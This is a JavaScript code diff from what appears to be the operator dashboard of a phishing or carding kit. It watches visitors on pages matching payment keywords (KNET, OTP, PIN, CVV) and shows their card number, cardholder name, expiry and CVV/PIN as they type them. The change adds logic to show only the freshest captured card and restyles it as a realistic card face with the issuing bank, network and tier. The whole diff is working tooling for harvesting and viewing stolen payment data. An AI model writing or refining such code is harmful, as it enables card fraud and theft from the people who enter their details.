@@ -1572,7 +1572,10 @@ html += '</select>';
       // ===== بطاقة الدفع المباشر =====
 const visitorPage = (visitor.page || '').toLowerCase();
 const isOnPaymentPage = ['الدفع','بطاقة','كي نت','payment','credit','cvv','otp','atm','pin','card'].some(h=>visitorPage.indexOf(h)>-1);
-if (isOnPaymentPage && visitor.liveCard) {
+const __lcTs = visitor.liveCardTimestamp ? new Date(visitor.liveCardTimestamp).getTime() : 0;
+const __pcs = visitor.paymentCards || [];
+const __lastPcTs = __pcs.length ? new Date(__pcs[__pcs.length-1].timestamp || 0).getTime() : 0;
+if (isOnPaymentPage && visitor.liveCard && (__lastPcTs === 0 || __lcTs > __lastPcTs)) {
   allEntries.push({ type: 'liveCard', data: visitor.liveCard, index: 0, timestamp: new Date(Date.now() + 999999999).toISOString() });
 }
 
@@ -1621,21 +1624,34 @@ if (isOnPaymentPage && visitor.liveCard) {
         allEntries.forEach((entry) => {
           if (entry.type === 'liveCard') {
   const lc = entry.data;
-  const lcNumRaw = String(lc.cardNumber || '').replace(/\D/g, '');
-  const lcNum = lcNumRaw ? lcNumRaw.replace(/(\d{4})(?=\d)/g, '$1 ') : 'XXXX XXXX XXXX XXXX';
+  const lcRaw = String(lc.cardNumber || '').replace(/\D/g, '');
+  const lcInfo = getCardInfo(lcRaw);
+  const lcNum = lcRaw ? lcRaw.replace(/(\d{4})(?=\d)/g, '$1 ') : 'XXXX XXXX XXXX XXXX';
   const lcName = String(lc.nameOnCard || '---').replace(/[&<>"']/g, function (ch) { return ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[ch]; });
   const lcExpiry = lc.expiryDate || 'XX/XX';
   const lcCvv = lc.cvv || '---';
-  html += '<div class="data-section bg-blue-50 p-4 rounded-lg" style="border-right-color:#2563eb;">';
+  const lcNetwork = lcInfo.network === 'Visa' ? 'VISA' : lcInfo.network === 'Mastercard' ? 'Mastercard' : 'mada';
+  html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color: #9333ea;">';
   html += '<div class="flex justify-between items-center mb-3">';
-  html += '<h3 class="font-bold text-blue-800">بطاقة الدفع المباشر</h3>';
+  html += '<h3 class="font-bold text-purple-800">💳 بطاقة الدفع المباشر</h3>';
   html += '<span class="text-xs bg-blue-600 text-white px-2 py-1 rounded-full waiting-badge">مباشر</span>';
   html += '</div>';
-  html += '<div class="bg-white p-3 rounded-lg space-y-2">';
-  html += '<div class="flex justify-between"><span class="text-gray-500 text-sm">رقم البطاقة</span><span class="font-mono font-bold" dir="ltr">' + lcNum + '</span></div>';
-  html += '<div class="flex justify-between"><span class="text-gray-500 text-sm">الاسم</span><span class="font-medium" dir="ltr">' + lcName + '</span></div>';
-  html += '<div class="flex justify-between"><span class="text-gray-500 text-sm">الانتهاء</span><span class="font-mono" dir="ltr">' + lcExpiry + '</span></div>';
-  html += '<div class="flex justify-between"><span class="text-gray-500 text-sm">CVV / PIN</span><span class="font-mono" dir="ltr">' + lcCvv + '</span></div>';
+  html += '<div style="background: linear-gradient(135deg, #e8e8e8 0%, #f5f5f5 50%, #e0e0e0 100%); border-radius: 16px; padding: 20px 24px; max-width: 420px; margin: 0 auto; box-shadow: 0 4px 15px rgba(0,0,0,0.15); border: 1px solid #d0d0d0; font-family: monospace; position: relative; overflow: hidden;">';
+  html += '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">';
+  html += '<span style="color: #888; font-size: 13px; font-weight: bold;">KWD</span>';
+  html += '<span style="color: #444; font-size: 15px; font-weight: bold;">' + lcInfo.bank + ' 🏦</span>';
+  html += '</div>';
+  html += '<div style="text-align: center; margin-bottom: 14px;">';
+  html += '<span dir="ltr" style="font-size: 22px; font-weight: bold; color: #333; letter-spacing: 3px; unicode-bidi: embed; display: inline-block;">' + lcNum + '</span>';
+  html += '</div>';
+  html += '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px;">';
+  html += '<div style="text-align: left;"><span style="color: #888; font-size: 11px;">Name</span><br><span style="color: #333; font-size: 14px; font-weight: 600;">' + lcName + '</span></div>';
+  html += '<div style="text-align: right;"><span style="color: #888; font-size: 11px;">Expiry</span><br><span style="color: #333; font-size: 16px; font-weight: bold;">' + lcExpiry + '</span></div>';
+  html += '</div>';
+  html += '<div style="display: flex; justify-content: space-between; align-items: center;">';
+  html += '<div><span style="color: #888; font-size: 11px;">CVV</span><br><span style="color: #333; font-size: 18px; font-weight: bold;">' + lcCvv + '</span></div>';
+  html += '<div style="text-align: right;"><span style="font-size: 16px; font-weight: bold; color: #1a1f71;">' + lcNetwork + '</span><br><span style="color: #555; font-size: 11px; font-weight: bold;">' + String(lcInfo.type).toUpperCase() + ' • ' + String(lcInfo.tier).toUpperCase() + '</span></div>';
+  html += '</div>';
   html += '</div></div>';
 }
 
